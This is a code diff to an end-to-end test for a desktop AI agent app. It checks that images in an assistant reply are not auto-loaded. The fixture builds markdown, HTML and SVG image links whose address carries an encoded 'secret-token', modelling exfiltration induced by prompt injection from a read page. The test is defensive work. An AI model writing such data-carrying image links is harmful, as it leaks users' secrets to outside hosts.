@@ -6,6 +6,7 @@
 import assert from 'node:assert/strict';
 import { spawnSync } from 'node:child_process';
 import fs from 'node:fs';
+import http from 'node:http';
 import os from 'node:os';
 import path from 'node:path';
 import { test } from 'node:test';
@@ -580,6 +581,8 @@ test('desktop app end to end', { timeout: 15 * 60_000 }, async (t) => {
       assert.equal(await page.locator('[data-notebook] [data-cell]').count(), 5);
       assert.ok(await page.locator('.katex .mord').count() > 20, 'KaTeX with mhchem and the physics macros');
       assert.equal(await page.locator('.katex-error').count(), 0, 'every formula parsed');
+      // Drawn by a plugin's renderer a moment after the block appears: wait for it, then count.
+      await page.waitForSelector('[data-artifact="diagram"] [data-diagram-svg]', { timeout: 30_000 });
       assert.equal(await page.locator('[data-artifact="diagram"] [data-diagram-svg]').count(), 1, 'a diagram block is drawn (core.diagrams)');
       // Tables: filter, stats, pivot.
       const table = page.locator('[data-widget="CSV"] [data-table]').first();
@@ -641,6 +644,50 @@ test('desktop app end to end', { timeout: 15 * 60_000 }, async (t) => {
       assert.equal(probe.storage, 'blocked');
       assert.equal(probe.top, 'blocked');
       assert.equal(probe.fetch, 'blocked');
+    });
+
+    await step('an image on the web in a reply is never requested by the window: it is named with its whole address, and loading it is the person\'s click, through the engine\'s guard', async () => {
+      let hits = 0;
+      const local = http.createServer((_q, r) => { hits++; r.writeHead(200, { 'content-type': 'image/png' }); r.end(); });
+      await new Promise<void>((r) => local.listen(0, '127.0.0.1', r));
+      const at = `http://127.0.0.1:${(local.address() as { port: number }).port}/pixel.png?d=c2VjcmV0LXRva2Vu`;
+      try {
+        // What a page the agent read would have it write: an image whose address carries what the agent knows.
+        const text = `Here is the summary.\n\n![chart](${at})\n\n<img src="${at}&via=html">\n\n![logo](https://images.test/ok.png)\n\n\`\`\`svg\n<svg xmlns="http://www.w3.org/2000/svg" width="20" height="20"><image href="${at}&via=svg" width="20" height="20"/></svg>\n\`\`\``;
+        const r = await api('POST', '/api/sessions/import', { runtime: 'local', bundle: { ...longBundle(0), source: { ...longBundle(0).source, title: 'Remote images' }, history: [{ role: 'user', content: [{ type: 'text', text: 'Summarise that page.' }] }, { role: 'assistant', content: [{ type: 'text', text }] }] } });
+        assert.equal(r.status, 201, JSON.stringify(r.body));
+        const id = (r.body as { id: string }).id;
+        await page.click('[data-nav="core.chat:search"]');
+        await page.evaluate((sid) => { sessionStorage.setItem('harness.route', JSON.stringify({ view: 'core.chat:session', params: { id: sid } })); }, id);
+        await page.click(`[data-session-row="${id}"] button`);
+        const first = page.locator('[data-remote-image]').first();
+        await first.waitFor();
+        assert.equal(await first.getAttribute('data-remote-image'), new URL(at).host);
+        assert.equal(await first.locator('[data-remote-image-url]').innerText(), at, 'the whole address is shown');
+        assert.match(await first.locator('[data-remote-image-carries]').innerText(), /carries extra data/);
+        await page.waitForSelector('iframe[data-artifact-frame="svg"]', { timeout: 30_000 });
+        await page.waitForTimeout(1500);
+        assert.equal(hits, 0, 'the window asked for nothing: not the image, not the HTML tag, not the SVG');
+        // Whatever the app's code did, the window's policy refuses a direct load.
+        const direct = await page.evaluate((u) => new Promise<string>((res) => { const i = new Image(); i.onload = () => res('loaded'); i.onerror = () => res('blocked'); i.src = u; }), `${at}&via=code`);
+        assert.equal(direct, 'blocked');
+        assert.equal(hits, 0);
+        // The click goes to the engine, and its guard does not reach this computer's own addresses.
+        await first.locator('[data-remote-image-load]').click();
+        const why = first.locator('[role="alert"]');
+        await why.waitFor();
+        assert.match(await why.innerText(), /not loaded: 127\.0\.0\.1 resolves to a private address/);
+        assert.equal(hits, 0);
+        // An image on the web proper comes through the engine and is shown from a local copy.
+        const logo = page.locator('[data-remote-image="images.test"]');
+        assert.equal(await logo.locator('[data-remote-image-carries]').count(), 0);
+        await shot('remote-image', page.locator('[data-assistant-message]').last());
+        await logo.locator('[data-remote-image-load]').click();
+        await page.waitForSelector('[data-image] img[src^="blob:"]');
+        await page.waitForFunction(() => { const i = document.querySelector<HTMLImageElement>('[data-image] img[src^="blob:"]'); return !!i && i.complete && i.naturalWidth === 1; });
+        assert.equal(await page.locator('[data-remote-image="images.test"]').count(), 0, 'the placeholder gave way to the image');
+        assert.equal(hits, 0);
+      } finally { local.close(); }
     });
 
     await step('a 1,000-message transcript opens, scrolls and streams without long tasks over 100 ms', async () => {
@@ -1028,6 +1075,9 @@ test('desktop app end to end', { timeout: 15 * 60_000 }, async (t) => {
       || (/\/api\/memory\?/.test(e.text) && /404/.test(e.text))
       // Moving the home restarts the engine, which cuts the open event streams (they reconnect).
       || (/harness home/.test(e.phase) && /ERR_FAILED|Failed to load resource/.test(e.text))
+      // The two refusals that step provokes on purpose: the policy stopping the test's own direct load, and the
+      // engine's guard answering the click. The reply's image, HTML tag and SVG log nothing: they are never tried.
+      || (/an image on the web in a reply/.test(e.phase) && (/&via=code' violates the following Content Security Policy directive: "img-src/.test(e.text) || /status of 422 .*\(harness:\/\/app\/api\/remote-image\)/.test(e.text)))
     ));
     assert.deepEqual(unexpected, [], 'no unexpected errors in the window');
     assert.deepEqual(errors.filter((e) => /switched on and off live/.test(e.phase)), [], 'switching plugins logs nothing at all');
